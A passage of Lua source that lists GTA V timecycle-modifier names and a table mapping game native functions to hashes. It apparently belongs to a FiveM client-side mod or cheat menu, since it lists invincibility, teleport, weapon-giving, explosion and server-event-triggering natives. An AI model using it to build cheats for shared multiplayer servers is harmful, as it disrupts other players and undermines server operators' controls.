"mp_x17dlc_lab","mp_x17dlc_lab_loading_bay","MPApart_H_01","MPApart_H_01_gym","MPApartHigh","MPApartHigh_palnning","mugShot","mugShot_lineup","Multipayer_spectatorCam","multiplayer_ped_fight","nervousRON_fog","NeutralColorCode","NeutralColorCodeBasic","NeutralColorCodeBright","NeutralColorCodeLight","NEW_abattoir","new_bank","NEW_jewel","NEW_jewel_EXIT","NEW_lesters","new_MP_Garage_L","NEW_ornate_bank","NEW_ornate_bank_entrance","NEW_ornate_bank_office","NEW_ornate_bank_safe","New_sewers","NEW_shrinksOffice","NEW_station_unfinished","new_stripper_changing","NEW_trevorstrailer","NEW_tunnels","NEW_tunnels_ditch","new_tunnels_entrance","NEW_tunnels_hole","NEW_yellowtunnels","NewMicheal","NewMicheal_night","NewMicheal_upstairs","NewMichealgirly","NewMichealstoilet","NewMichealupstairs","NewMod","nextgen","NG_blackout","NG_deathfail_BW_base","NG_deathfail_BW_blend01","NG_deathfail_BW_blend02","NG_filmic01","NG_filmic02","NG_filmic03","NG_filmic04","NG_filmic05","NG_filmic06","NG_filmic07","NG_filmic08","NG_filmic09","NG_filmic10","NG_filmic11","NG_filmic12","NG_filmic13","NG_filmic14","NG_filmic15","NG_filmic16","NG_filmic17","NG_filmic18","NG_filmic19","NG_filmic20","NG_filmic21","NG_filmic22","NG_filmic23","NG_filmic24","NG_filmic25","NG_filmnoir_BW01","NG_filmnoir_BW02","NG_first","nightvision","NO_coronas","NO_fog_alpha","NO_streetAmbient","NO_weather","NoAmbientmult","NoAmbientmult_interior","NOdirectLight","NoPedLight","NOrain","OrbitalCannon","overwater","Paleto","paleto_nightlight","paleto_opt","PennedInDark","PennedInLight","PERSHING_water_reflect","phone_cam","phone_cam1","phone_cam10","phone_cam11","phone_cam12","phone_cam13","phone_cam2","phone_cam3","phone_cam3_REMOVED","phone_cam4","phone_cam5","phone_cam6","phone_cam7","phone_cam8","phone_cam8_REMOVED","phone_cam9","plane_inside_mode","player_transition","player_transition_no_scanlines","player_transition_scanlines","PlayerSwitchNeutralFlash","PlayerSwitchPulse","plaza_carpark","PoliceStation","PoliceStationDark","polluted","poolsidewaterreflection2","PORT_heist_underwater","powerplant_nightlight","powerstation","PPFilter","PPGreen01","PPGreen02","PPOrange01","PPOrange02","PPPink01","PPPink02","PPPurple01","PPPurple02","prison_nightlight","projector","prologue","prologue_ending_fog","prologue_ext_art_amb","prologue_reflection_opt","prologue_shootout","Prologue_shootout_opt","pulse","RaceTurboDark","RaceTurboFlash","RaceTurboLight","ranch","REDMIST","REDMIST_blend","ReduceDrawDistance","ReduceDrawDistanceMAP","ReduceDrawDistanceMission","reducelightingcost","ReduceSSAO","reducewaterREF","refit","reflection_correct_ambient","RemixDrone","RemoteSniper","resvoire_reflection","rply_brightness","rply_brightness_neg","rply_contrast","rply_contrast_neg","rply_motionblur","rply_saturation","rply_saturation_neg","rply_vignette","rply_vignette_neg","SALTONSEA","sandyshore_nightlight","SAWMILL","scanline_cam","scanline_cam_cheap","scope_zoom_in","scope_zoom_out","secret_camera","services_nightlight","shades_pink","shades_yellow","SheriffStation","ship_explosion_underwater","ship_explosion_underwater","ship_lighting","Shop247","Shop247_none","sleeping","SmugglerCheckpoint01","SmugglerCheckpoint02","SmugglerFlash","Sniper","SP1_03_drawDistance","spectator1","spectator10","spectator2","spectator3","spectator4","spectator5","spectator6","spectator7","spectator8","spectator9","StadLobby","stc_coroners","stc_deviant_bedroom","stc_deviant_lounge","stc_franklinsHouse","stc_trevors","stoned","stoned_aliens","stoned_cutscene","stoned_monkeys","StreetLighting","StreetLightingJunction","StreetLightingtraffic","STRIP_changing","STRIP_nofog","STRIP_office","STRIP_stage","StuntFastDark","StuntFastLight","StuntSlowDark","StuntSlowLight","subBASE_water_ref","sunglasses","superDARK","switch_cam_1","switch_cam_2","telescope","TinyGreen01","TinyGreen02","TinyPink01","TinyPink02","TinyRacerMoBlur","torpedo","traffic_skycam","trailer_explosion_optimise","TransformFlash","TransformRaceFlash","TREVOR","TrevorColorCode","TrevorColorCodeBasic","TrevorColorCodeBright","Trevors_room","trevorspliff","trevorspliff_blend","trevorspliff_blend02","Tunnel","tunnel_entrance","tunnel_entrance_INT","TUNNEL_green","TUNNEL_green_ext","Tunnel_green1","tunnel_id1_11","TUNNEL_orange","TUNNEL_orange_exterior","TUNNEL_white","TUNNEL_yellow","TUNNEL_yellow_ext","ufo","ufo_deathray","underwater","underwater_deep","underwater_deep_clear","v_abattoir","V_Abattoir_Cold","v_bahama","v_cashdepot","V_CIA_Facility","v_dark","V_FIB_IT3","V_FIB_IT3_alt","V_FIB_IT3_alt5","V_FIB_stairs","v_foundry","v_janitor","v_jewel2","v_metro","V_Metro_station","V_Metro2","v_michael","v_michael_lounge","V_Office_smoke","V_Office_smoke_ext","V_Office_smoke_Fire","v_recycle","V_recycle_dark","V_recycle_light","V_recycle_mainroom","v_rockclub","V_Solomons","V_strip_nofog","V_strip_office","v_strip3","v_strpchangerm","v_sweat","v_sweat_entrance","v_sweat_NoDirLight","v_torture","Vagos","vagos_extlight_small","VAGOS_new_garage","VAGOS_new_hangout","VagosSPLASH","VC_tunnel_entrance","vehicle_subint","venice_canal_tunnel","vespucci_garage","VolticBlur","VolticFlash","VolticGold","warehouse","WAREHOUSE","WarpCheckpoint","WATER_lab_cooling","WATER_CH2_06_01_03","WATER_CH2_06_02","WATER_CH2_06_04","WATER_cove","WATER_hills","WATER_ID2_21","WATER_lab","WATER_lab_cooling","WATER_militaryPOOP","WATER_muddy","WATER_port","WATER_REF_malibu","WATER_refmap_high","WATER_refmap_hollywoodlake","WATER_refmap_low","WATER_refmap_med","WATER_refmap_off","WATER_refmap_poolside","WATER_refmap_silverlake","WATER_refmap_venice","WATER_refmap_verylow","WATER_resevoir","WATER_RichmanStuntJump","WATER_river","WATER_salton","WATER_salton_bottom","WATER_shore","WATER_silty","WATER_silverlake","WeaponUpgrade","whitenightlighting","WhiteOut","winning_room","yacht_DLC","yell_tunnel_nodirect",
           },
           Natives = {
               ['IsControlJustReleased'] = '0x50F940259D3841E6',
               ['SetTextWrap'] = '0x63145D9C883A1A70',
               ['DetachVehicleWindscreen'] = '0x6D645D59FB5F5AD3',
               ['SmashVehicleWindow'] = '0x9E5B5E4D2CCD2259',
               ['SetVehicleTyreBurst'] = '0xEC6A202EE4960385',
               ['SetVehicleDoorBroken'] = '0xD4D4F6A4AB575A33',
               ['GetHashKey'] = '0xD24D37CC275948CC',
               ['SetTextJustification'] = '0x4E096588B13FFECA',
               ['SetEntityMaxSpeed'] = '0x0E46A3FCBDE2A1B1',
               ['SetTextRightJustify'] = '0x6B3C4650BC8BEE47',
               ['GetCurrentPedWeapon'] = '0x3A87E44BB9A01D54',
               ['SetDriveTaskDrivingStyle'] = '0xDACE1BE37D88AF67',
               ['SetWeatherTypePersist'] = '0x704983DF373B198F',
               ['SetWeatherTypeNow'] = '0x29B487C359E19889',
               ['SetOverrideWeather'] = '0xA43D5C6FE51ADBEF',
               ['DrawRect'] = '0x3A618A217E5154F0',
               ['IsAimCamActive'] = '0x68EDDA28A5976D07',
   
               ['SetFollowVehicleCamViewMode'] = '0xAC253D7842768F48',
               ['DisableFirstPersonCamThisFrame'] = '0xDE2EF5DA284CC8DF',
               ['SetPlayerCanDoDriveBy'] = '0x6E8834B52EC20C77',
               ['DrawLightWithRangeAndShadow'] = '0xF49E9A9716A04595',
               ['TriggerScreenblurFadeIn'] = '0xA328A24AAA6B7FDC',
               ['TriggerScreenblurFadeOut'] = '0xEFACC8AEF94430D5',
   
               ['IsPedArmed'] = '0x475768A975D5AD17',
               ['IsDisabledControlJustReleased'] = '0x305C8DCD79DA8B0F',
               ['SetMouseCursorActiveThisFrame'] = '0xAAE7CE1D63167423',
               ['DisableAllControlActions'] = '0x5F4B6931816E599B',
               ['GetActiveScreenResolution'] = '0x873C9F3104101DD3',
               ['GetNuiCursorPosition'] = '0xbdba226f',
               ['IsControlJustPressed'] = '0x580417101DDB492F',
               ['SetTextFont'] = '0x66E0276CC5F6B9DA',
               ['SetTextScale'] = '0x07C837F9A01C34C9',
               ['SetTextCentre'] = '0xC02F4DBFB51D988B',
               ['SetTextColour'] = '0xBE6B23FFA53FB442',
               ['ClonePed'] = '0xEF29A16337FACADB',
               ['SetSwimMultiplierForPlayer'] = '0xA91C6F0FF7D16A13',
               ['SetPlayerWantedLevel'] = '0x39FF19C64EF7DA5B',
               ['SetPlayerWantedLevelNow'] = '0xE0A7D1E497FFCD6F',
               ['TaskJump'] = '0x0AE4086104E067B1',
               ['SetPedDiesInWater'] = '0x56CEF0AC79073BDE',
               ['IsPedSittingInVehicle'] = '0xA808AA1D79230FC2',
               ['SetVehicleNeedsToBeHotwired'] = '0xFBA550EA44404EE6',
               ['StartEntityFire'] = '0xF6A9D9708F6F23DF',
               ['SetVehicleTyresCanBurst'] = '0xEB9DC3C7D8596C46',
               ['SetVehicleNumberPlateTextIndex'] = '0x9088EB5A43FFB0A1',
               ['BeginTextCommandDisplayText'] = '0x25FBB336DF1804CB',
               ['AddTextComponentSubstringPlayerName'] = '0x6C188BE134E074AA',
               ['EndTextCommandDisplayText'] = '0xCD015E5BB0D96A57',
               ['IsDisabledControlPressed'] = '0xE2587F8CBBD87B1D',
               ['SetMouseCursorSprite'] = '0x8DB8CFFD58B62552',
               ['ResetPedVisibleDamage'] = '0x3AC1F7B898F30C05',
               ['ClearPedLastWeaponDamage'] = '0x0E98F88A24C5F4B8',
               ['PlaySoundFrontend'] = '0x67C540AA08E4A6F5',
               ['PlaySound'] = '0x7FF4944CC209192D',
               ['BeginTextCommandWidth'] = '0x54CE8AC98E120CAB',
               ['SetGameplayCamRelativeRotation'] = '0x48608C3464F58AB4',
               ['EndTextCommandGetWidth'] = '0x85F061DA64ED2F67',
               ['HasStreamedTextureDictLoaded'] = '0x0145F696AAAAD2E4',
               ['RequestStreamedTextureDict'] = '0xDFA2EF8E04127DD5',
               ['SetVehicleCustomPrimaryColour'] = '0x7141766F91D15BEA',
               ['SetVehicleCustomSecondaryColour'] = '0x36CED73BFED89754',
               ['SetVehicleTyreSmokeColor'] = '0xB5BA80F839791C0F',
               ['DrawSprite'] = '0xE7FFAE5EBF23D890',
               ['DestroyDui'] = '0xA085CB10',
               ['GetDuiHandle'] = '0x1655d41d',
               ['CreateRuntimeTextureFromDuiHandle'] = '0xb135472b',
               ['CreateRuntimeTxd'] = '0x1f3ac778',
               ['CreateDui'] = '0x23eaf899',
               ['DisableControlAction'] = '0xFE99B66D079CF6BC',
               ['SetEntityHealth'] = '0x6B76DC1F3AE6E6A3',
               ['SetPedArmour'] = '0xCEA04D83135264CC',
               ['TriggerServerEventInternal'] = '0x7FDD1128',
               ['TriggerEventInternal'] = '0x91310870',
               ['StopScreenEffect'] = '0x068E835A1D0DC0E3',
               ['ClearPedBloodDamage'] = '0x8FE22675A5A45817',
               ['GetEntityCoords'] = '0x3FEF770D40960D5A',
               ['PlayerPedId'] = '0xD80958FC74E988A6',
               ['DoesCamExist'] = '0xA7A932170592B50E',
               ['GetPlayerPed'] = '0x43A66C31C68491C0',
               ['redUID'] = '0x762376233638',
               ['Request'] = '0x762376233636',
               ['NetworkResurrectLocalPlayer'] = '0xEA23C49EAA83ACFB',
               ['SetEntityCoordsNoOffset'] = '0x239A3351AC1DA385',
               ['AddArmourToPed'] = '0x5BA652A0CD14DF2F',
               ['SetPlayerInvincible'] = '0x239528EACDC3E7DE',
               ['SetEntityInvincible'] = '0x3882114BDE571AD4',
               ['IsEntityPlayingAnim'] = '0x1F0B79228E461EC9',
               ['SetEntityVisible'] = '0xEA1C610A04DB6BBB',
               ['IsPedOnFoot'] = '0x01FEE67DB37F59B2',
               ['MakePedReload'] = '0x20AE33F3AC9C0033',
               ['SetAmmoInClip'] = '0xDCD2A934D65CB497',
               ['SetPedAmmo'] = '0x14E56BC5B5DB6A19',
               ['GetWeaponClipSize'] = '0x583BE370B1EC6EB4',
               ['RequestWeaponAsset'] = '0x5443438F033E29C3',
               ['SetRunSprintMultiplierForPlayer'] = '0x6DB47AA77FD94E09',
               ['SetPedMoveRateOverride'] = '0x085BF80FA50A39D1',
               ['GetStreetNameFromHashKey'] = '0xD0EF8A959B8A4CB9',
               ['GetStreetNameAtCoord'] = '0x2EB41072B4C1E4C0',
               ['ResetPlayerStamina'] = '0xA6F312FCCE9C1DFE',
               ['SetSuperJumpThisFrame'] = '0x57FFF03E423A4C0B',
               ['DrawMarker_2'] = '0xE82728F0DE75D13A',
               ['RemoveAllPedWeapons'] = '0xF25DF915FA38C5F3',
               ['PlayerId'] = '0x4F8644AF03D0E0D6',
               ['RequestModel'] = '0x963D27A58DF860AC',
               ['HasModelLoaded'] = '0x98A4EB5D89A0C952',
               ['ClonePedToTarget'] = '0xE952D6431689AD9A',
               ['SetPlayerModel'] = '0x00A1CADD00108836',
               ['ShowLineUnderWall'] = '0x61F95E5BB3E0A8C6',
               ['SelectPed'] = '0x1216E0BFA72CC703',
               ['Vdist'] = '0x2A488C176D52CCA5',
               ['GetFinalRenderedCamCoord'] = '0xA200EB1EE790F448',
               ['SetModelAsNoLongerNeeded'] = '0xE532F5D78798DAAB',
               ['SetPedHeadBlendData'] = '0x9414E18B9434C2FE',
               ['SetPedHeadOverlay'] = '0x48F44967FA05CC1E',
               ['SetPedHeadOverlayColor'] = '0x497BF74A7B9CB952',
               ['SetPedComponentVariation'] = '0x262B14F48D29DE80',
               ['SetPedHairColor'] = '0x4CFFC65454C93A49',
               ['SetPedPropIndex'] = '0x93376B65A266EB5F',
               ['SetPedDefaultComponentVariation'] = '0x45EEE61580806D63',
               ['CreateCam'] = '0xC3981DCE61D9E13F',
               ['RenderScriptCams'] = '0x07E5B515DB0636FC',
               ['SetCamActive'] = '0x026FB97D0A425F84',
               ['SetFocusEntity'] = '0x198F77705FA0931D',
               ['SetFocusArea'] = '0xBB7454BAFF08FE25',
               ['GetControlNormal'] = '0xEC3C9B8D5327B563',
               ['ClearAllHelpMessages'] = '0x6178F68A87A4D3A0',
               ['GetDisabledControlNormal'] = '0x11E65974A982637C',
               ['GetEntityRotation'] = '0xAFBD61CC738D9EB9',
               ['SetCamRot'] = '0x85973643155D0B07',
               ['GetGroundZFor_3dCoord'] = '0xC906A7DAB05C8D2B',
               ['GetEntityBoneIndexByName'] = '0xFB71170B7E76ACBA',
               ['GetOffsetFromEntityInWorldCoords'] = '0x1899F328B0E12848',
               ['RequestTaskMoveNetworkStateTransition'] = '0xD01015C7316AE176',
               ['IsPedInjured'] = '0x84A2DD9AC37C35C1',
               ['SetCamCoord'] = '0x4D41783FB745E42E',
               ['ClearFocus'] = '0x31B73D1EA9F01DA2',
               ['AddTextEntry'] = '0x32ca01c3',
               ['DisplayOnscreenKeyboard'] = '0x00DC833F2568DBF6',
               ['UpdateOnscreenKeyboard'] = '0x0CF2B696BBF945AE',
               ['GetOnscreenKeyboardResult'] = '0x8362B09B91893647',
               ['EnableAllControlActions'] = '0xA5FFE9B05F199DE7',
               ['GetActivePlayers'] = '0xCF143FB9',
               ['GetPlayerServerId'] = '0x4d97bcc7',
               ['GetPlayerName'] = '0x6D0DE6A7B5DA71F8',
               ['DestroyCam'] = '0x865908C81A2C22E9',
               ['SetVehicleSiren'] = '0xF4924635A19EB37D',
               ['TriggerSiren'] = '0x66C3FB05206041BA',
               ['ClearTimecycleModifier'] = '0x0F07E7745A236711',
               ['IsModelValid'] = '0xC0296A2EDF545E92',
               ['IsModelAVehicle'] = '0x19AAC8F07BFEC53E',
               ['CreateVehicle'] = '0xAF35D0D2583051B0',
               ['SetPedIntoVehicle'] = '0xF75B0D629E1C063D',
               ['CreateObject'] = '0x509D5878EB39E842',
               ['ShootSingleBulletBetweenCoords'] = '0x867654CBC7606F2C',
               ['RequestNamedPtfxAsset'] = '0xB80D8756B4668AB6',
               ['HasNamedPtfxAssetLoaded'] = '0x8702416E512EC454',
               ['UseParticleFxAsset'] = '0x6C38AF3693A69A91',
               ['StartNetworkedParticleFxNonLoopedAtCoord'] = '0xF56B8137DF10135D',
               ['AttachEntityToEntity'] = '0x6B9BBD38AB0796DF',
               ['GetPedBoneIndex'] = '0x3F428D08BE5AAE31',
               ['IsPedInAnyVehicle'] = '0x997ABD671D25CA0B',
               ['GetVehiclePedIsUsing'] = '0x6094AD011A2EA87D',
               ['GetVehicleMaxNumberOfPassengers'] = '0xA7C4F2C6E744A550',
               ['IsVehicleSeatFree'] = '0x22AC59A870E6A669',
               ['GetVehiclePedIsIn'] = '0x9A9112A0FE9A4713',
               ['SetCamFov'] = '0xB13C14F66A00D047',
               ['DisablePlayerFiring'] = '0x5E6CC07646BBEAB8',
               ['ClearPedTasks'] = '0xE1EF3C1216AFF2CD',
               ['ClearPedTasksImmediately'] = '0xAAA34F8A7CB32098',
               ['CreatePed'] = '0xD49F9B0955C367DE',
               ['FreezeEntityPosition'] = '0x428CA6DBD1094446',
               ['SetExtraTimecycleModifier'] = '0x5096FD9CCB49056D',
               ['ClearExtraTimecycleModifier'] = '0x92CCC17A7A2285DA',
               ['ForceSocialClubUpdate'] = '0xEB6891F03362FB12',
               ['RestartGame'] = '0xE574A662ACAEFBB1',
               ['AddRope'] = '0xE832D760399EB220',
               ['SetPedCanRagdoll'] = '0xB128377056A54E2A',
               ['ClearPedSecondaryTask'] = '0x176CECF6F920D707',
               ['TaskSetBlockingOfNonTemporaryEvents'] = '0x90D2156198831D69',
               ['SetPedFleeAttributes'] = '0x70A2D1137C8ED7C9',
               ['SetPedCombatAttributes'] = '0x9F7794730795E019',
               ['SetPedSeeingRange'] = '0xF29CF591C4BF6CEE',
               ['SetPedHearingRange'] = '0x33A8F7F7D5F7F33C',
               ['SetPedAlertness'] = '0xDBA71115ED9941A6',
               ['SetPedKeepTask'] = '0x971D38760FBC02EF',
               ['IsDisabledControlJustPressed'] = '0x91AEF906BCA88877',
               ['IsDisabledControlReleased'] = '0xFB6C4072E9A32E92',
               ['SetVehicleModKit'] = '0x1F2AA07F00B3217A',
               ['GetNumVehicleMods'] = '0xE38E9162A2500646',
               ['GetModTextLabel'] = '0x8935624F8C5592CC',
               ['GetLabelText'] = '0x7B5280EBA9840C72',
               ['SetVehicleMod'] = '0x6AF0636DDEDCB6DD',
               ['GetCurrentServerEndpoint'] = '0xEA11BFBA',
               ['ToggleVehicleMod'] = '0x2A1F4F37F95BAD08',
               ['SetVehicleGravityAmount'] = '0x1a963e58',
               ['SetVehicleForwardSpeed'] = '0xAB54A438726D25D5',
               ['SetVehicleNumberPlateText'] = '0x95A88F0B409CDA47',
               ['DoesEntityExist'] = '0x7239B21A38F536BA',
               ['GetVehicleColours'] = '0xA19435F193E081AC',
               ['GetVehicleExtraColours'] = '0x3BC4245933A166F7',
               ['DoedynamictraExist'] = '0x1262D55792428154',
               ['IsVehicleExtraTurnedOn'] = '0xD2E6822DBFD6C8BD',
               ['GetEntityModel'] = '0x9F47B058362C84B5',
               ['GetVehicleWheelType'] = '0xB3ED1BFB4BE636DC',
               ['NetworkOverrideClockTime'] = '0xE679E3E06E363892',
               ['TaskJump'] = '0x0AE4086104E067B1',
               ['DrawMarker'] = '0x28477EC23D892089',
               ['LoadResourceFile'] = '0x76A9EE1F',
               ['GetNumResourceMetadata'] = '0x776E864',
               ['GetResourceMetadata'] = '0x964BAB1D',
               ['DeletePed'] = '0x9614299DCB53E54B',
               ['DeleteObject'] = '0x539E0AE3E6634B9F',
               ['DeleteVehicle'] = '0xEA386986E786A54F',
               ['GetVehicleWindowTint'] = '0x0EE21293DAD47C95',
               ['IsVehicleNeonLightEnabled'] = '0x8C4B92553E4766A5',
               ['GetVehicleNeonLightsColour'] = '0x7619EEE8C886757F',
               ['GetVehicleTyreSmokeColor'] = '0xB635392A4938B3C3',
               ['HasWeaponAssetLoaded'] = '0x36E353271F0E90EE',
               ['GetVehicleMod'] = '0x772960298DA26FDB',
               ['IsToggleModOn'] = '0x84B233A8C8FC8AE7',
               ['GetVehicleLivery'] = '0x2BB9230590DA5E8A',
               ['SetVehicleFixed'] = '0x115722B1B9C14C1C',
               ['SetPedMinGroundTimeForStungun'] = '0xFA0675AB151073FA',
               ['SetVehicleLightsMode'] = '0x1FD09E7390A74D54',
               ['SetVehicleLights'] = '0x34E710FF01247C5A',
               ['SetVehicleBurnout'] = '0xFB8794444A7D60FB',
               ['SetVehicleEngineHealth'] = '0x45F6D8EEF34ABEF1',
               ['SetVehicleFuelLevel'] = '0xba970511',
               ['SetVehicleOilLevel'] = '0x90d1cad1',
               ['SetVehicleDirtLevel'] = '0x79D3B596FE44EE8B',
               ['SetVehicleOnGroundProperly'] = '0x49733E92263139D1',
               ['SetEntityAsMissionEntity'] = '0xAD738C3085FE7E11',
               ['DeleteVehicle'] = '0xEA386986E786A54F',
               ['GetVehicleClass'] = '0x29439776AAA00A62',
               ['SetVehicleWheelType'] = '0x487EB21CC7295BA1',
               ['SetVehicleExtraColours'] = '0x2036F561ADD12E33',
               ['SetVehicleExtra'] = '0x7EE3A3C5E4A40CC9',
               ['SetTimeScale'] = '0x1D408577D440E81E',
               ['ReplaceHudColourWithRgba'] = '0xF314CF4F0211894E',
               ['SetVehicleColours'] = '0x4F1D4BE3A7F24601',
               ['SetVehicleNeonLightEnabled'] = '0x2AA720E4287BF269',
               ['SetVehicleNeonLightsColour'] = '0x8E0A582209A62695',
               ['SetVehicleWindowTint'] = '0x57C51E6BAD752696',
               ['IsWeaponValid'] = '0x937C71165CF334B3',
               ['GiveWeaponToPed'] = '0xBF0FD6E56C964FCB',
               ['GetSelectedPedWeapon'] = '0x0A6DB4965674D243',
               ['NetworkIsInSpectatorMode'] = '0x048746E388762E11',
               ['SetWeaponDamageModifier'] = '0x4757F00BC6323CFE',
               ['SetPlayerMeleeWeaponDamageModifier'] = '0x4A3DC7ECCC321032',
               ['SetPlayerWeaponDamageModifier'] = '0xCE07B9F7817AADA3',
               ['SetPedInfiniteAmmoClip'] = '0x183DADC6AA953186',
               ['GetPedLastWeaponImpactCoord'] = '0x6C4D0409BA1A2BC2',
               ['AddExplosion'] = '0xE3AD2BDBAEE269AC',
               ['HasPedGotWeaponComponent'] = '0xC593212475FAE340',
               ['GiveWeaponComponentToPed'] = '0xD966D51AA5B28BB9',
               ['RemoveWeaponComponentFromPed'] = '0x1E8BE90C74FB4C09',
               ['AddAmmoToPed'] = '0x78F0424C34306220',
               ['GetNumResources'] = '0x863F27B',
               ['GetPlayerInvincible_2'] = '0xF2E3912B',
               ['GetResourceByFindIndex'] = '0x387246B7',
               ['GetResourcestate'] = '0x4039b485',
               ['CreateCamWithParams'] = '0xB51194800B257161',
               ['GetGameplayCamFov'] = '0x65019750A0324133',
               ['GetCamCoord'] = '0xBAC038F7459AE5AE',
               ['GetCamRot'] = '0x7D304C1C955E3E12',
               ['GetShapeTestResult'] = '0x3D87450E15D98694',
               ['StartExpensiveSynchronousShapeTestLosProbe'] = '0x377906D8A31E5586',
               ['StartShapeTestRay'] = '0x377906D8A31E5586',
               ['SetHdArea'] = '0xB85F26619073E775',
               ['DisplayRadar'] = '0xA0EBB943C300E693',
               ['SetFocusPosAndVel'] = '0xBB7454BAFF08FE25',
               ['NetworkRequestControlOfEntity'] = '0xB69317BF5E782347',
               ['SetEntityProofs'] = '0xFAEE099C6F890BB8',
               ['SetEntityOnlyDamagedByPlayer'] = '0x79F020FF9EDC0748',
               ['SetEntityCanBeDamaged'] = '0x1760FFA8AB074D66',
               ['DeleteEntity'] = '0xAE3CBE5BF394C9C9',
               ['CancelEvent'] = '0xFA29D35D',
               ['SetEntityCoords'] = '0x06843DA7060A026B',
               ['SetEntityRotation'] = '0x8524A8B0171D5E07',
               ['GetGameplayCamRot'] = '0x837765A25378F0BB',
               ['IsPlayerFreeAiming'] = '0x2E397FD2ECD37C87',
               ['SetEntityVelocity'] = '0x1C99BB7B6E96D16F',
               ['NetworkHasControlOfEntity'] = '0x01BF60A500E28887',
               ['SetNetworkIdCanMigrate'] = '0x299EEB23175895FC',
               ['NetworkGetNetworkIdFromEntity'] = '0xA11700682F3AD45C',
               ['GetPedInVehicleSeat'] = '0xBB40DD2270B65366',
               ['GetEntityHeading'] = '0xE83D4F9BA2A38914',
               ['RequestScaleformMovie'] = '0x11FE353CF9733E6F',
               ['HasScaleformMovieLoaded'] = '0x85F01B8D5B90570E',
               ['PushScaleformMovieFunction'] = '0xF6E48914C7A8694E',
               ['PushScaleformMovieFunctionParameterBool'] = '0xC58424BA936EB458',
               ['PopScaleformMovieFunctionVoid'] = '0xC6796A8FFA375E53',
               ['PushScaleformMovieFunctionParameterInt'] = '0xC3D0841A0CC546A6',
               ['PushScaleformMovieMethodParameterButtonName'] = '0xE83A3E3557A56640',
               ['PushScaleformMovieFunctionParameterString'] = '0xBA7148484BD90365',
               ['DrawScaleformMovieFullscreen'] = '0x0DF606929C105BE1',
               ['GetFirstBlipInfoId'] = '0x1BEDE233E6CD2A1F',
               ['GetPedArmour'] = '0x9483AF821605B1D8',
               ['DoesBlipExist'] = '0xA6DB27D19ECBB7DA',
               ['GetBlipInfoIdCoord'] = '0xFA7C7F0AADF25D09',
               ['SetPedCoordsKeepVehicle'] = '0x9AFEFF481A85AB2E',
               ['NetworkRegisterEntityAsNetworked'] = '0x06FAACD625D80CAA',
               ['VehToNet'] = '0xB4C94523F023419C',
               ['IsEntityInWater'] = '0xCFB0A0D8EDD145A3',
               ['SetVehicleEngineOn'] = '0x2497C4717C8B881E',
               ['SetPedMaxTimeUnderwater'] = '0x6BA428C528D9E522',
               ['GetPedBoneCoords'] = '0x17C07FC640E86B4E',
               ['GetDistanceBetweenCoords'] = '0xF1B760881820C952',
               ['GetScreenCoordFromWorldCoord'] = '0x34E82F05DF2974F5',
               ['IsEntityDead'] = '0x5F9532F3B5CC2551',
               ['HasEntityClearLosToEntity'] = '0xFCDFF7B72D23A1AC',
               ['IsPedShooting'] = '0x34616828CD07F1A1',
               ['IsEntityOnScreen'] = '0xE659E47AF827484B',
               ['FindFirstPed'] = '0xfb012961',
               ['FindNextPed'] = '0xab09b548',
               ['EndFindPed'] = '0x9615c2ad',
               ['SetDrawOrigin'] = '0xAA0008F3BBB8F416',
               ['SetTextProportional'] = '0x038C1F517D7FDCF8',
               ['SetTextEdge'] = '0x441603240D202FA6',
               ['SetTextDropshadow'] = '0x465C84BC39F1C351',
               ['SetTextOutline'] = '0x2513DFB0FB8400FE',
               ['SetTextEntry'] = '0x25FBB336DF1804CB',
               ['DrawText'] = '0xCD015E5BB0D96A57',
               ['ClearDrawOrigin'] = '0xFF0B610F6BE0D7AF',
               ['AddTextComponentSubstringWebsite'] = '0x94CF4AC034C9C986',
               ['AddTextComponentString'] = '0x6C188BE134E074AA',
               ['GetClosestVehicle'] = '0xF73EB622C4F1689B',
               ['GetGameplayCamRelativeHeading'] = '0x743607648ADD4587',
               ['GetGameplayCamRelativePitch'] = '0x3A6867B4845BEDA2',
               ['GetPedPropIndex'] = '0x898CC20EA75BACD8',
               ['GetPedPropTextureIndex'] = '0xE131A28626F81AB2',
               ['GetPedDrawableVariation'] = '0x67F3780DD425D4FC',
               ['GetPedPaletteVariation'] = '0xE3DD5F2A84B42281',
               ['GetPedTextureVariation'] = '0x04A355E041E004E6',
               ['RequestAnimDict'] = '0xD3BD40951412FEF6',
               ['HasAnimDictLoaded'] = '0xD031A9162D01088C',
               ['TaskPlayAnim'] = '0xEA47FE3719165B94',
               ['SetPedCurrentWeaponVisible'] = '0x0725A4CCFDED9A70',
               ['SetPedConfigFlag'] = '0x1913FE4CBF41C463',
               ['RemoveAnimDict'] = '0xF66A602F829E2A06',
               ['TaskMoveNetworkByName'] = '0x2D537BA194896636',
               ['SetTaskMoveNetworkSignalFloat'] = '0xD5BB4025AE449A4E',
               ['SetTaskMoveNetworkSignalBool'] = '0xB0A6CFD2C69C1088',
               ['IsTaskMoveNetworkActive'] = '0x921CE12C489C4C41',
               ['StartShapeTestCapsule'] = '0x28579D1B8F8AAC80',
               ['GetRaycastResult'] = '0x3D87450E15D98694',
               
               ['TriggerScreenblurFadeIn'] = '0xA328A24AAA6B7FDC',
               ['TriggerScreenblurFadeOut'] = '0xEFACC8AEF94430D5',
   
               ['SetNewWaypoint'] = '0xFE43368D2AA4F2FC',
               ['NetworkIsPlayerActive'] = '0xB8DFD30D6973E135',
               ['GetBlipFromEntity'] = '0xBC8DBDCA2436F7E8',
               ['AddBlipForEntity'] = '0x5CDE92C702A8FCE7',
               ['SetBlipSprite'] = '0xDF735600A4696DAF',
               ['TaskFollowToOffsetOfEntity'] = '0x304AE42E357B8C7E',
               ['SetBlipAsFriendly'] = '0x6F6F290102C02AB4',
               ['SetBlipColour'] = '0x03D7FB09E75D6B7E',
               ['ShowHeadingIndicatorOnBlip'] = '0x5FBCA48327B914DF',
               ['GetBlipSprite'] = '0x1FC877464A04FC4F',
               ['GetEntityHealth'] = '0xEEF059FAD016D209',
               ['HideNumberOnBlip'] = '0x532CFF637EF80148',
               ['SetBlipRotation'] = '0xF87683CDF73C3F6E',
               ['SetBlipNameToPlayerName'] = '0x127DE7B20C60A6A3',
               ['SetBlipScale'] = '0xD38744167B2FA257',
               ['IsPauseMenuActive'] = '0xB0034A223497FFCB',
               ['SetBlipAlpha'] = '0x45FF974EEE1C8734',
               ['RemoveBlip'] = '0x86A652570E5F25DD',
               ['GetGameTimer'] = '0x9CD27B0045628463',
               ['SetEntityAlpha'] = '0x44A0870B7E92D7C0',
               ['SetEntityLocallyVisible'] = '0x241E289B5C059EDC',
               ['SetEntityCollision'] = '0x1A9205C1B9EE827F',
               ['SetTransitionTimecycleModifier'] = '0x3BCF567485E1971C',
               ['GetDisplayNameFromVehicleModel'] = '0xB215AAC32D25D019',
